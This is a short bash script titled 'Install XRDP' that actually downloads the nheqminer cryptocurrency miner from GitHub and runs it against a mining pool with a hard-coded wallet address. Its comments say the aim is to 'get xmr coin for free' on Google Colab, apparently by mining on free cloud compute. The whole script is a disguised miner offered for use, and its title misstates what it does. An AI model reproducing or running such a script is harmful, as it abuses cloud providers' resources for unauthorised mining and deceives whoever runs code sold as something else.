#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
nheqminer/nheqminer -v -l stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u 86bDqhG1c4XZXWcU9cX5qREg2E7ANWKhs4YwDQxSW6rmeTRQD4nqaECYjzt7Q5a3fWeDctULPjVFS55Dg3jPzgT1Tb7JNRg -p c=XMR,mc=VRSC,ID=Xmrmining -t 4
